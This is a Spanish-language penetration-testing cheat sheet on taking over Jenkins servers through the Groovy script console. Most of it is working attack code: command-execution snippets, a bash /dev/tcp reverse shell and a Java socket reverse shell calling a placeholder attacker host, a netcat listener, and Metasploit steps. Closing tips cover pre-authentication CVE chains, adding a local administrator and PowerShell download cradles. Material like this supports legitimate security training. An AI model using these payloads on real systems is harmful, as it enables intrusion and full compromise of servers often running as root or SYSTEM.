---
tags:
  - webapp
  - jenkins
  - attack
---
## Conceptos Clave (TL;DR)
* Jenkins posee una consola de scripts `/script` que permite a los usuarios ejecutar código Apache Groovy directamente en el entorno del controlador.
* Esta característica legítima puede abusarse para ejecutar comandos arbitrarios en el sistema operativo subyacente, actuando de facto como una web shell.
* A menudo, el servicio de Jenkins se ejecuta bajo el contexto de cuentas con altos privilegios, como `root` en Linux o `SYSTEM` en Windows, lo que facilita el compromiso total del sistema.
* El código fuente de Groovy se compila en Java Bytecode, lo que significa que los scripts de ataque funcionarán en cualquier plataforma que tenga instalado JRE.

## Herramientas Clave
* **Navegador Web:** Utilizado para acceder directamente a la interfaz web de Jenkins y a la consola de ejecución de scripts.
* **Netcat (nc):** Empleado en la máquina atacante para establecer un listener que intercepte las conexiones entrantes (reverse shells) generadas por los scripts maliciosos.
* **Metasploit:** Mencionado como un framework alternativo que dispone de módulos específicos para automatizar la obtención de shells desde la consola de scripts.

## Metodología Paso a Paso
1. **Fase 1: Acceso a la Interfaz de Jenkins.** Se requiere identificar credenciales débiles o configuraciones por defecto para ingresar a la plataforma.
2. **Fase 2: Acceso a la Consola de Scripts.** Navegar directamente a la ruta `http://<TARGET_IP>:<PORT>/script` para acceder al intérprete de Groovy.
3. **Fase 3: Verificación de Ejecución y Privilegios.** Ejecutar comandos inofensivos de reconocimiento (como `id` o `dir`) usando Groovy para confirmar que la ejecución de comandos a nivel de sistema operativo es posible y verificar el usuario actual.
4. **Fase 4: Establecimiento de Reverse Shell.** Inyectar un script Groovy que contenga un payload de reverse shell dirigido a la máquina atacante, obteniendo así acceso interactivo por consola al servidor.

## Cheat Sheet de Comandos

```bash
# Preparar el listener de Netcat en la máquina atacante para recibir la reverse shell
# -l: Modo escucha, -v: Verbose, -n: No resolver DNS, -p: Puerto específico
nc -lvnp <ATTACKER_PORT>
```

```groovy
# Ejecutar comandos de reconocimiento en Linux desde la consola Groovy (ej. comando 'id')
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

```groovy
# Reverse Shell en Linux desde la consola Groovy
# Ejecuta /bin/bash y redirige la entrada/salida estándar hacia la IP y puerto del atacante usando /dev/tcp
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```groovy
# Ejecutar comandos de reconocimiento en Windows desde la consola Groovy (ej. comando 'dir')
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

```groovy
# Reverse Shell basada en Java (Multiplataforma/Windows) desde la consola Groovy
# Instancia un socket de red conectado al atacante y vincula los streams del proceso cmd.exe
String host="<ATTACKER_IP>";
int port=<ATTACKER_PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
msf use exploit/multi/http/jenkins_script_console 
msf exploit(jenkins_script_console) > show targets ...targets... 
msf exploit(jenkins_script_console) > set TARGET < target-id > 
msf exploit(jenkins_script_console) > show options ...show and set options... 
msf exploit(jenkins_script_console) > set payload linux/x64/meterpreter/reverse_tcp
msf exploit(jenkins_script_console) > exploit
```

## "Gotchas" y Troubleshooting
* **RCE Pre-Autenticado:** Existen vulnerabilidades públicas que combinan CVE-2018-1999002 y CVE-2019-1003000 para lograr ejecución remota de código sin autenticación, evadiendo las protecciones del sandbox (efectivo en versiones como la 2.137).
* **Usuarios Anónimos Peligrosos:** En Jenkins 2.150.2 existe una vulnerabilidad a través de Node.js que requiere permisos de "JOB creation" y "BUILD"; si el acceso anónimo está habilitado, el exploit funcionará porque estos usuarios poseen dichos permisos por defecto.
* **Dependencia de Versiones:** La mayoría de los exploits públicos de RCE para Jenkins son altamente específicos a la versión del software. Versiones más recientes, como la LTS 2.303.1, tienen parcheadas las vulnerabilidades de evasión de ACL y Node.js detalladas previamente.
* **Alternativas en Windows:** En lugar de lanzar una reverse shell, ejecutar comandos para agregar un usuario local al grupo de administradores y conectar vía RDP o WinRM puede ser más estable. También se puede utilizar un "download cradle" de PowerShell (como `Invoke-PowerShellTcp.ps1`) para cargar payloads en memoria y evadir cambios en disco.